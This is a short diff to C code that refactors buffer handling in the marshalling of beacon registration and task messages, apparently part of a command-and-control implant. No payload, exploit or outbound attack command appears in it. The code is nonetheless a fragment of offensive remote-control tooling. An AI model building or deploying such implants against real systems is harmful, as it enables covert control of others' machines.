@@ -105,11 +105,8 @@ PENVELOPE MarshalBeaconTasks
 	pFinalElement = CreateStructElement(BeaconTasksElements, _countof(BeaconTasksElements), 0);
 	pResult = ALLOC(sizeof(ENVELOPE));
 	pResult->uType = MsgBeaconTasks;
-	pResult->pData = ALLOC(sizeof(BUFFER));
-	pResult->pData->pBuffer = pFinalElement->pMarshalledData;
-	pResult->pData = pFinalElement->pMarshalledData;
+	pResult->pData = BufferMove(pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
 	pFinalElement->pMarshalledData = NULL;
-	pFinalElement->pMarshalledData = 0;
 CLEANUP:
 	if (MarshaledTasks != NULL) {
 		FREE(MarshaledTasks);
@@ -245,10 +242,8 @@ BOOL BeaconRegister
 	BeaconRegElements[4] = CreateVarIntElement(GetNextCheckin(pBeacon), 5);
 
 	pFinalElement = CreateStructElement(BeaconRegElements, _countof(BeaconRegElements), 0);
-	RegisterEnvelope.pData->pBuffer = pFinalElement->pMarshalledData;
-	RegisterEnvelope.pData->cbBuffer = pFinalElement->cbMarshalledData;
 	RegisterEnvelope.uType = MsgBeaconRegister;
-	pFinalElement->pMarshalledData = NULL;
+	RegisterEnvelope.pData = BufferMove(pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
 	Result = pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, &RegisterEnvelope);
 CLEANUP:
 	if (lpHostName != NULL) {
